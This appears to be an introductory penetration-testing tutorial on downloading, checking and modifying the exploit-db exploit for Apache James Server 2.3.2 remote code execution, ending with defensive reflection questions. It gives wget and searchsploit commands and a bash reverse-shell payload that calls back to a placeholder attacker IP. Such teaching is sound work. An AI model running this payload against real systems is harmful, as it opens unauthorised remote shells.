# Exploits 101

Â Many available exploits are written in Python, Perl, Ruby, or Bash, and can be downloaded directy on the attack box.
These must be inspected and analyzed to confirm they perform what is advertised. Once we're sure it's accurate, generally, it is necessary to modify default / parameters from a POC (such as `ifconfig`) to one more suited for exploitation to gain a reverse shell, or bind shell.

### Downloading Exploits

* From Exploit-db via browser
* `wget https://www.exploit-db.com/download/35513 -O 35513.py` 
* Copying the exploit code directly from Searchsploit
  * `searchsploit 3513`
  * `searchsploit 35513 -p` # to show the full path
  * `cp /usr/share/exploitdb/exploits/linux/remote/35513.py ./` 

### Analyzing and Modifying 

We are trying to:

* Verify the exploit works as advertised
* Get an understanding of how the vulnerability is exploited
* See if there are any instructions from the Author on code that needs to be modified
* Modify the code based on the target

### Verify

Using 35513.py as a reference, the exploit title shows this is `Apache James Server 2.3.2 Remote Code Execution`. 
Any Remote Code Execution exploit should contain at least a `[targeted host ip]`, `[port]`, and `[payload]`. Let's check for parameters

### Modifying the Exploit

We want to get a shell on the target, so we need to modify the payload. Using the same exploit from above (35513.py or Apache James), we can replace the payload with the following:
```bash
bash -i >& /dev/tcp/[attacker IP]/[port] 0>&1 
# If the reverse shell session closes, try entering `bash` before the connection drops
```

### Afterthoughts

You are a network administrator, responsible for this server. What could you do to mitigate the threat?

If you were the developer and had to fix this vulnerability, how would you?

[Exploiting Apache James](https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf)

